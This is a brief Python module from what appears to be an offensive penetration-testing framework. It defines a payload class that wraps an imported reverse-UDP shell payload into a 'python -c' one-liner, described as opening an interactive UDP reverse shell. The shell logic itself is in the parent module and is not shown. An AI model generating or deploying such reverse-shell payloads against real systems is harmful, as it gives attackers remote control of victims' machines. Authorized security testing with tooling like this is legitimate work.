from thg.core.exploit import *
from thg.modules.payloads.python.reverse_udp import Payload as PythonBindUDP


class Payload(PythonBindUDP):
    __info__ = {
        "name": "Python Reverse UDP One-Liner",
        "description": "Creates interactive udp reverse shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thg module
        )
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        self.fmt = self.cmd + ' -c "{}"'
        payload = super(Payload, self).generate()
        return payload
